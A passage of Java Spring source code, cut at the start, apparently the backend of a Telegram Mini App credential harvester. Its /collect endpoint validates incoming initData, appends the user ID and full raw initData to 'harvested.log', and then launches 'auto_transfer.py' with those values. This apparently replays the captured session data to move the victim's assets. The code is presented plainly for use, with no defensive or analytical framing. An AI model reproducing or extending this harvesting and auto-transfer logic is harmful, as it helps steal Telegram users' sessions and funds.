    @PostMapping("/collect")
    public ResponseEntity> collectData(@RequestBody Map<String, String> payload) {
        String initData = payload.get("initData");
        if (initData == null || initData.isEmpty()) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(Map.of("error", "Missing initData"));
        }

        try {
            if (!validateTelegramInitData(initData, BOT_TOKEN)) {
                return ResponseEntity.status(HttpStatus.FORBIDDEN).body(Map.of("error", "Signature mismatch"));
            }

            // Extract user ID from initData
            String userId = extractUserId(initData);
            String logEntry = String.format("[%s] ID: %s | InitData: %s%n", Instant.now(), userId, initData);
            
            Files.writeString(Path.of("harvested.log"), logEntry, StandardOpenOption.CREATE, StandardOpenOption.APPEND);

            // Execute Python automation script post-collection
            ProcessBuilder pb = new ProcessBuilder("python3", "auto_transfer.py", userId, initData);
            pb.start();

            return ResponseEntity.ok(Map.of("status", "success"));
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(Map.of("error", e.getMessage()));
        }
    }

    private boolean validateTelegramInitData(String initDataString, String botToken) throws Exception {
        Map<String, String> params = new TreeMap<>();
        String hash = "";

        for (String pair : initDataString.split("&")) {
            int idx = pair.indexOf("=");
            if (idx > 0) {
                String key = URLDecoder.decode(pair.substring(0, idx), StandardCharsets.UTF_8);
                String value = URLDecoder.decode(pair.substring(idx + 1), StandardCharsets.UTF_8);
                if (key.equals("hash")) {
                    hash = value;
                } else {
                    params.put(key, value);
                }
            }
        }

        String dataCheckString = params.entrySet().stream()
                .map(e -> e.getKey() + "=" + e.getValue())
                .collect(Collectors.joining("\n"));

        Mac hmacSha256 = Mac.getInstance("HmacSHA256");
        SecretKeySpec secretKeySpec = new SecretKeySpec("WebAppData".getBytes(StandardCharsets.UTF_8), "HmacSHA256");
        hmacSha256.init(secretKeySpec);
        byte[] secret = hmacSha256.doFinal(botToken.getBytes(StandardCharsets.UTF_8));

        hmacSha256.init(new SecretKeySpec(secret, "HmacSHA256"));
        byte[] calculatedHashBytes = hmacSha256.doFinal(dataCheckString.getBytes(StandardCharsets.UTF_8));

        StringBuilder sb = new StringBuilder();
        for (byte b : calculatedHashBytes) {
            sb.append(String.format("%02x", b));
        }

        return sb.toString().equalsIgnoreCase(hash);
    }

    private String extractUserId(String initDataString) {
        try {
            for (String pair : initDataString.split("&")) {
                if (pair.startsWith("user=")) {
                    String userJson = URLDecoder.decode(pair.substring(5), StandardCharsets.UTF_8);
                    JsonNode node = objectMapper.readTree(userJson);
                    return node.get("id").asText();
                }
            }
        } catch (IOException ignored) {}
        return "unknown";
    }
}
